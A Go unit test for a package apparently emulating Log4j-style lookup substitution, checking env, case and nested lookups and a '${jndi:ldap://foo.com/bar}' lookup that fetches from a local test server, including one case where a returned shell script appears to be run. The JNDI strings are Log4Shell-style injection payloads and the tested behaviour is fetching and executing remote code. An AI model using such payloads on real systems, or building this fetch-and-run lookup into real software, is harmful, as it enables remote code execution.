package jndi

import (
	"context"
	"fmt"
	"net"
	"net/http"
	"net/http/httptest"
	"testing"
)

func TestSubst(t *testing.T) {
	envVar := map[string]string{
		"USER": "alice",
		"HOME": "/home/alice",
	}
	var responseFormat string
	ts := httptest.NewServer(http.HandlerFunc(func(w http.ResponseWriter, r *http.Request) {
		fmt.Fprintf(w, responseFormat, r.URL.Path)
	}))
	defer ts.Close()

	e := env{
		getEnv: func(k string) string { return envVar[k] },
		transport: &http.Transport{
			DialContext: func(ctx context.Context, netw, addr string) (net.Conn, error) {
				c, err := net.Dial("tcp", ts.Listener.Addr().String())
				if err != nil {
					t.Errorf("dial error: %v", err)
				}
				return c, err
			},
		},
	}
	tests := []struct {
		in, format, want string
	}{
		{in: "foo${env:user}bar", want: "fooalicebar"},
		{in: "lower ${lower:FOO}", want: "lower foo"},
		{in: "upper ${upper:foo}", want: "upper FOO"},
		{in: "nested ${env:${lower:u}ser}", want: "nested alice"},
		{in: "hit network: ${jndi:ldap://foo.com/bar}", want: "hit network: got-path=/bar"},
		{in: "hit network: ${jndi:ldap://foo.com/bar}", want: "hit network: got-path=/bar", format: "#!/bin/sh\n#%v\necho -n got-path=$PATH_INFO"},
	}
	for _, tt := range tests {
		responseFormat = "got-path=%v"
		if tt.format != "" {
			responseFormat = tt.format
		}
		if got := e.subst(tt.in); got != tt.want {
			t.Errorf("subst(%q) = %q; want %q", tt.in, got, tt.want)
		}
	}
}
